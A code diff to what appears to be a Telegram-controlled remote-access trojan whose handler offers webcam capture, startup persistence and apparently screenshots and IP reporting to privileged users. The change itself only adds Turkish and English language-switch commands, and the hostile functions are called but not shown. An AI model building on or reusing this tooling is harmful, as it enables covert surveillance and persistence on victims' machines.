@@ -236,7 +236,9 @@ tr_menu=telepot.namedtuple.ReplyKeyboardMarkup(
         telepot.namedtuple.KeyboardButton(text="/as")],
         [telepot.namedtuple.KeyboardButton(text="/ss"),
         telepot.namedtuple.KeyboardButton(text="/cam"),
-        telepot.namedtuple.KeyboardButton(text="/ip"),
+        telepot.namedtuple.KeyboardButton(text="/ip")],
+        [telepot.namedtuple.KeyboardButton(text="/tr"),
+        telepot.namedtuple.KeyboardButton(text="/en"),
         telepot.namedtuple.KeyboardButton(text="/yardim")]
     ],
     resize_keyboard=True
@@ -249,7 +251,9 @@ en_menu=telepot.namedtuple.ReplyKeyboardMarkup(
         telepot.namedtuple.KeyboardButton(text="/as")],
         [telepot.namedtuple.KeyboardButton(text="/ss"),
         telepot.namedtuple.KeyboardButton(text="/cam"),
-        telepot.namedtuple.KeyboardButton(text="/ip"),
+        telepot.namedtuple.KeyboardButton(text="/ip")],
+        [telepot.namedtuple.KeyboardButton(text="/tr"),
+        telepot.namedtuple.KeyboardButton(text="/en"),
         telepot.namedtuple.KeyboardButton(text="/help")]
     ],
     resize_keyboard=True
@@ -501,6 +505,16 @@ def handle(msg):
             pass
     elif text.startswith("/cam") and userid in ROOT_ACCESS:
         webcam_shot()
+    elif text.startswith("/en") and userid in ROOT_ACCESS:
+        try:
+            lang="en"
+            bot.sendMessage(chatid,f"Langue is set English!")
+        except:bot.sendMessage(chatid,f"Error while setting language to English!")
+    elif text.startswith("/tr") and userid in ROOT_ACCESS:
+        try:
+            lang="tr"
+            bot.sendMessage(chatid,f"Dil Türkçeye çevirildi.")
+        except:bot.sendMessage(chatid,f"Dil Türkçeye çevirilirken hata ile karşılaşıldı!")
     elif text.startswith("/as") and userid in ROOT_ACCESS:
         add_startup()
     elif text.startswith("/rs") and userid in ROOT_ACCESS: 
